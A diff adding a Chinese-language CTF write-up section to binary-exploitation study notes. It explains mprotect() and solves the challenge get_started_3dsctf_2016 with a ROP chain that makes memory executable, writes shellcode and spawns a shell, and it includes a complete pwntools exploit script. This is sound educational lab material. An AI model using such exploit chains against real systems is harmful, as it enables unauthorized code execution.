@@ -238,6 +238,77 @@
 
 根据演示其实可以知道，如果需要进行栈迁移，其实需要两次`leave`指令，第一次迁移`ebp`，第二次迁移`esp`
 
+## mportect
+
+`mprotect()`是POSIX标准库中的一个函数，用于设置某块内存区域的权限，函数原型为
+
+```c
+int mprotect(void * addr, size_t len, int prot)
+```
+
+- `addr`：对应内存区域的指针，特别注意，这里的指针地址必须是4k对齐，即末尾三位必须是`000`
+- `len`：内存区域的大小
+- `prot`：指定内存区域所拥有的权限，类似于Linux系统中的权限编号方式，如`r--`为1，`-w-`为2，`--x`为4，`rwx`为7
+
+### get_started_3dsctf_2016
+
+以题目`get_started_3dsctf_2016`为例，我们来实际操作一下
+
+`mprotect`的题目一般出现于静态链接的程序中，大体攻击思路是使用`mprotect()`函数修改`.bss`段的权限，然后使用`read()`等函数向`.bss`写入`shellcode`，最后操控程序执行流指向`.bss`以获取`shell`
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4[56]; // [esp+4h] [ebp-38h] BYREF
+
+  printf("Qual a palavrinha magica? ", v4[0]);
+  gets(v4);
+  return 0;
+}
+```
+
+主函数中的`gets(v4)`显然存在栈溢出漏洞，而且我们在函数表中找到了`mprotect()`
+
+> <img src="./img0/32.png">
+
+现在来寻找可用的写入地址
+
+> <img src="./img0/33.png">
+
+可以看到`got`表是一个不错的写入地址，因此我们的攻击思路就是通过栈溢出将程序跳转到`mprotect()`，然后通过`mprotect()`修改`got`表的权限，然后跳转到`read()`，使用`read()`向`got`表写入`shellcode`，最后跳转到`got`表以达到攻击目的
+
+在攻击之前，我们需要考虑栈上发生的变化，首先是栈溢出56字节，接4字节`prev ebp`，然后是`mprotect_addr`
+
+`mprotect_addr`的返回地址本应是`read_addr`，但是由于`mprotect()`拥有三个参数，需要在跳转`read()`之前将这三个参数弹出栈顶，以避免程序将`mprotect`的参数作为返回地址解析，因此我们还需要寻找三个`pop`
+
+> <img src="./img0/34.png">
+
+如图，我们找到了一个`pop ebx; pop esi; pop edi; ret`，作为`mprotect()`的返回地址，后接三个参数`got_addr`、`0x1000`和`0x7`，然后便是`read_addr`，这里三个`pop`尽量不要选择如`pop ebp`、`pop esp`等会对栈造成影响的`gadget`
+
+`read()`本身也有三个参数`fd`、`buf`和`len`，因此`read_addr`后接三个`pop`，然后接`read()`的三个参数`0`、`got_addr`和`0x100`，最后接`read()`的返回地址`got_addr`
+
+**exp**
+
+```py
+from pwn import *
+
+sh = process('./pwn0')
+# sh = remote('node5.buuoj.cn', 29626)
+
+mprotect = 0x0806EC80
+pop_ret = 0x080509A5
+got_addr = 0x080EB000
+read_addr = 0x0806E140
+# 注意这一题的main()函数栈帧中没有prev ebp，溢出长度不需要+4
+payload = flat([cyclic(56), mprotect, pop_ret, got_addr, 0x1000, 0x7, read_addr, pop_ret, 0, got_addr, 0x100, got_addr])
+sh.sendline(payload)
+shellcode = asm(shellcraft.sh())
+sh.sendline(shellcode)
+sh.interactive()
+```
+
+> <img src="./img0/35.png">
+
 ## 格式化字符串
 
 对于如下C代码
